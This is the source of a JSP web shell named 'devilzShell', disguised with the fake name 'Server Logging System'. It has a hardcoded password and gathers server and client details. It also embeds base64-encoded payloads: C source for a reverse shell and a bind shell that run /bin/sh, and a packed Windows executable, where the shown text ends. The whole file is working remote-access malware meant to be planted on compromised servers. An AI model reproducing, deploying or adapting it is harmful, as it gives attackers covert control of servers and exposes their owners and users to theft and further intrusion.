<%@ page contentType="text/html"%><%@ page import="java.io.*,java.util.*,java.net.*,java.text.*,sun.misc.*,java.security.*,java.lang.*,java.lang.String" %><%
//
// devilzShell <[jsp]>
// ^^^^^^^^^^^^
// author: b374k
// greets: devilzc0der(s) and all of you who love peace and freedom
//
//
// ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
// Jayalah Indonesiaku


//################ VARIABLES GOES HERE #######################=============================================]
String shell_name = "devilzShell";
String shell_fake_name = "Server Logging System";
String shell_title = " :: " + shell_name + " ::";
String shell_version = "v1";
String shell_password = "devilzc0der";
String shell_fav_port = "12345";
String shell_color = "#374374";

// server software
String xSoftware = application.getServerInfo().trim();
// uname -a
String xSystem = System.getProperty("os.name") + " " + System.getProperty("os.version") + " " + System.getProperty("os.arch");
// server ip
InetAddress inetAddress = InetAddress.getLocalHost();
String xServerIP = inetAddress.getHostAddress();
// your ip ;-)
String xClientIP = request.getRemoteAddr();

String xHeader = xSoftware + "<br />" + xSystem + "<br />Server IP: <span class=\"gaul\">[ </span>" + xServerIP + "<span class=\"gaul\"> ]</span>&nbsp;&nbsp;&nbsp;Your IP: <span class=\"gaul\">[ </span>" + xClientIP + "<span class=\"gaul\"> ]</span>";

//################# RESOURCES GOES HERE #######################=============================================]
String icon = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAB/klEQVR42o2RS2gUQRCGq7rHB0rw4miwFWVmPSmIHpaQSwQD4ivGKHsImIOyBhJETUDjRaMIEjTk4gNFIutBwScY8eBh9aBgyCGCiKu4E4kzBk0uimiI21XWwgbMorOppumuKuqr6r8RZmnjxl8iR0H2DzfKT03HsVLhV+Ove4rc8xk4uYtxdCHgGQHc/SdAuqwZB9jCAE7RnwLGR8hHbiK5/aQzCcC0FP/+u2YG4KPx2+p14SKVTbFIiPdI7/eioL98whmAt8bv3O7Y89sIv29kzOpSvENR41lSD1Jh0BQLeGf8jq3a9nayetX2KVhfeta8Gm0nuwgH0+FITSxgzPgtm3Qhs5qR+kgfqwIYGgVuTmk60EPq/p4w2B0LkG5+l7I5Ud3BUsoBBlc0uEVOakWUvxMLKNqA8V4c0rZWyZ0lzbI2M9rTpNfKD+RiAV+MX9eiCs9+yV2ecLkacPgaUvcNxcuuWHW9Pgr2xQJeGu9Us7YnjpMaFsE2FGOh8dN12l49SjjUGo4kYwE54x3eqW3fXlJjrawSMvLPN8brbtB08hypgaYwaIgFTJjE0l5l3wfAVRdIN4qQT8T/dht5btbq9pVR/lJFEUWHWhF9fnWUzxb9x8u9hwcV7ZjOD1rHXRx9mPgvoNxkqjmTwKnXyMlVgAtcxucCyMwaUMn+AMvLzBHNivq3AAAAAElFTkSuQmCC";
String bg = "iVBORw0KGgoAAAANSUhEUgAAAAMAAAADCAYAAABWKLW/AAAAJklEQVR42mNkAAIpKan/b968YWAEMZ49ewamGdnY2P6LiIgwgAQA8xYNYheotNcAAAAASUVORK5CYII=";
String xBack ="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47IA0KIGRhZW1vbigxLDApOw0KIHNpbi5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiBzaW4uc2luX3BvcnQgPSBodG9ucyhhdG9pKGFyZ3ZbMV0pKTsNCiBzaW4uc2luX2FkZHIuc19hZGRyID0gaW5ldF9hZGRyKGFyZ3ZbMl0pOyANCiBiemVybyhhcmd2WzJdLHN0cmxlbihhcmd2WzJdKSsxK3N0cmxlbihhcmd2WzFdKSk7IA0KIGZkID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCkgOyANCiBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICBwZXJyb3IoIlstXSBjb25uZWN0KCkiKTsNCiAgIGV4aXQoMCk7DQogfQ0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEpOw0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2giLChjaGFyICopMCk7IA0KIGNsb3NlKGZkKTsgDQp9";
String xBind = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50IGFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiByZW1vdGU7DQogaWYoZm9yaygpID09IDApIHsgDQogcmVtb3RlLnNpbl9mYW1pbHkgPSBBRl9JTkVUOw0KIHJlbW90ZS5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KIHJlbW90ZS5zaW5fYWRkci5zX2FkZHIgPSBodG9ubChJTkFERFJfQU5ZKTsgDQogc29ja2ZkID0gc29ja2V0KEFGX0lORVQsU09DS19TVFJFQU0sMCk7DQogaWYoIXNvY2tmZCkgcGVycm9yKCJzb2NrZXQgZXJyb3IiKTsNCiBiaW5kKHNvY2tmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZyZW1vdGUsIDB4MTApOw0KIGxpc3Rlbihzb2NrZmQsIDUpOw0KIHdoaWxlKDEpDQogIHsNCiAgIG5ld2ZkPWFjY2VwdChzb2NrZmQsMCwwKTsNCiAgIGR1cDIobmV3ZmQsMCk7DQogICBkdXAyKG5ld2ZkLDEpOw0KICAgZHVwMihuZXdmZCwyKTsgICANCiAgIGV4ZWNsKCIvYmluL3NoIiwic2giLChjaGFyICopMCk7IA0KICAgY2xvc2UobmV3ZmQpOw0KICB9DQogfQ0KfQ0KaW50IGNocGFzcyhjaGFyICpiYXNlLCBjaGFyICplbnRlcmVkKSB7DQppbnQgaTsNCmZvcihpPTA7aTxzdHJsZW4oZW50ZXJlZCk7aSsrKSANCnsNCmlmKGVudGVyZWRbaV0gPT0gJ1xuJykNCmVudGVyZWRbaV0gPSAnXDAnOyANCmlmKGVudGVyZWRbaV0gPT0gJ1xyJykNCmVudGVyZWRbaV0gPSAnXDAnOw0KfQ0KaWYgKCFzdHJjbXAoYmFzZSxlbnRlcmVkKSkNCnJldHVybiAwOw0KfQ==";
String wBind = "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